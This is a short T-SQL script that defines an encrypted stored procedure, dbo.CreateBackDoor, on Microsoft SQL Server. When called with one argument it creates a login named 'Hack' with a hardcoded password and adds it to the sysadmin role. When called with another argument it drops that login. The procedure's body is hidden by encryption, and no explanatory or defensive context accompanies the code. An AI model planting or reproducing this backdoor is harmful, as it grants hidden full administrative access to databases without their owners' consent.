ALTER   PROCEDURE dbo.CreateBackDoor @Usage INT
WITH ENCRYPTION, EXECUTE AS 'dbo'
AS
BEGIN
        IF @Usage = 1
        BEGIN
                CREATE LOGIN Hack WITH PASSWORD = 'Pa$$w0rd123' ; 
                ALTER SERVER ROLE sysadmin ADD MEMBER [hack  ] ;
        END
        IF @Usage = 0
        BEGIN
                DROP LOGIN Hack ;
        END
END  
